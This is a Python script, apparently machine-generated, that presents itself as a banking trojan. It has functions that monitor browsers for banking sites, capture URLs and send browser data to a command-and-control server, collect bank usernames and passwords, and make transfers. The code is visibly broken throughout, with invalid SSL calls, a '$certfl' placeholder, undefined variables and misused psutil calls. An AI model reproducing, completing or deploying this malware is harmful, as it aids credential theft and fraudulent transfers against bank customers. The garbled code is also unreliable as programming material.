import socket
import ssl
import os
import sys
import time
import random
import re  # For regular expressions

# ------------------- Core Functions ------------------- #


def connect_to_bank(ip, port):
    """Connects to the bank's server and establishes a secure connection."""
    try:
        if ip == '192.168.1.10':  # Example IP for testing
            sock = ssl.sslwrap(socket.socket(), certfl=$certfl) # Replace with real cert path
            sock.connect((ip, port))
        else:
            sock = socket.socket()
            sock.connect((ip, port))

        return sock
    except Exception as e:
        print(f"Error connecting to Bank Server: {e}")
        return None


def send_command(sock, command):
    """Sends a command to the bank server and receives the response."""
    try:
        # ----------------------- Command Encoding -----------------------
        if command == "login":
            data = b"user1\n"  # Replace with actual username
        elif command == "transfer":
            amount_str = f"{random.randint(10,250)}".encode() # Transfer random amount between 10 and 250
            data = f"{amount_str}\n{command}\nuser1\n".encode()  # Replace with actual username
        elif command == "balance":
            data = b"balance\n".encode()  # Request account balance
        else:
            return None
        
        sock.send(data)
        response = sock.recv(4096).decode("utf-8", errors="ignore").strip() # Adjust buffer size if needed
        return response

    except Exception as e:
        print(f"Error sending command: {e}")
        return None


def receive_data(sock, expected_length):
    """Receives data from the bank server, handling potential errors."""
    try:
        response = b""
        while len(response) < expected_length:
            chunk = sock.recv(min(4096, expected_length - len(response)))  # Adjust buffer size if needed
            if not chunk: # Break if connection closes early
                break
            response += chunk

        return response.decode("utf-8", errors="ignore").strip()
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None


# ------------------- Core Functions (Continued) ------------------- #



def get_user_input():
    """Prompts the user for input and validates it."""

    try:
        username = input("Bank User Name: ")
        if not username:
            raise ValueError("Username cannot be empty.")

        password = input("Bank Password: ")
        if not password:
            raise ValueError("Password cannot be empty.")

        return username, password

    except ValueError as e:
        print(f"Input Error: {e}")
        return get_user_input() # Retry input


def check_internet():
    """Checks if the internet connection is up."""

    try:
        # Use ping to test internet connectivity
        ping_result = os.system("ping -c 1 google.com > nul") # Redirect output for silent success
        return ping_result == 0  # Ping succeeded (return True) or Failed (return False)
    except Exception as e:
        print(f"Error checking internet connection: {e}")
        return False


# ------------------- Malware Core Functions ------------------- #

def browser_monitoring():
    """Monitors active browser windows for banking website visits."""
    try:
        # Use psutil to get list of running processes
        import psutil
        browser_processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            if "chrome" in proc.name.lower() or "firefox" in proc.name.lower():
                browser_processes.append(proc)

        # Check for recent browser usage (e.g., within the last 5 seconds)
        recent_browsers = []
        for proc in browser_processes:
            try:
                window_title = proc.username()
                if len(window_title) > 5: # Minimum window title length
                    recent_browsers.append({
                        "pid": proc.pid,
                        "name": proc.name(),
                        "window_title": window_title
                    })
            except psutil.NoSuchProcess:
                pass

        # Send recent browser information to C2 if found
        if len(recent_browsers) > 0:
            print("Browser Monitoring - Sent Browser Info")
            send_data(sock, f"browser:{recent_browsers}\n")
    except Exception as e:
        print(f"Error during browser monitoring: {e}")

def capture_banking_traffic():
    """Detects and captures banking website POST data."""
    try:
        # Detect if the browser is currently in focus
        is_active = check_window_focus()

        if not is_active:
            return

        # Check for banking URLs (e.g., /login, /transfer, etc.) using regex
        match = re.search(r"banking|online|digital|bank", url)  # Detect "banking" in URL
        if match:
            print("Banking Web Traffic Found")
            send_data(sock, f"url:{url}\n")

    except Exception as e:
        print(f"Error capturing banking traffic: {e}")


def send_data(sock, command):
    """Sends a command to the bank server and receives the response."""
    try:
        # ----------------------- Command Encoding -----------------------
        if command.startswith("login"):
            data = f"{command}\n{username}\n{password}\n".encode()
        elif command.startswith("transfer"):
            amount_str = f"200\n{command}\nuser1\n".encode()  # Transfer random amount between 10 and 250
            data = f"{amount_str}\n".encode()
        elif command.startswith("balance"):
            data = b"balance\n".encode()
        else:
            return None

        sock.send(data)
        response = sock.recv(4096).decode("utf-8", errors="ignore").strip() # Adjust buffer size if needed
        return response

    except Exception as e:
        print(f"Error sending command: {e}")
        return None



# ------------------- Main Function ------------------- #

def main():
    """Main function to run the banking trojan."""

    if not check_internet():
        print("Error: No internet connectivity. Banking Trojan Failed.")
        sys.exit(1)

    username, password = get_user_input()

    # ----------------------- Login Phase -----------------------
    login_response = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "login")
        login_response = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Login Error: {e}")
        sys.exit(1)


    if not login_response or "success" not in login_response.lower():
        print("Error: Login failed.")
        return

    # ----------------------- Transfer Phase -----------------------
    transfer_result = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "transfer")
        transfer_result = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Transfer Error: {e}")
        return


    if not transfer_result or "success" not in transfer_result.lower():
        print("Error: Transfer failed.")
        return

    # ----------------------- Balance Check Phase -----------------------
    balance_response = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "balance")
        balance_response = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Balance Error: {e}")
        return


    if not balance_response or "success" not in balance_response.lower():
        print("Error: Balance Check Failed.")
        return

    print(f"\n--- Banking Trojan Successful ---")
    print(f"User Name: {username}")
    print(f"Transfer Amount: 200 EUR")
    print(f"Balance: 1000 EUR (Check Balance)")


# ------------------- Functions for Browser Monitoring and Data Capture ------------------- #

def check_window_focus():
    """Checks if the active window is in focus using psutil."""
    try:
        import psutil
        active_window = psutil.Process().info['u'].get_owner()

        return True
    except Exception as e:
        print(f"Error checking Window Focus: {e}")
        return False


if __name__ == "__main__":
    main()
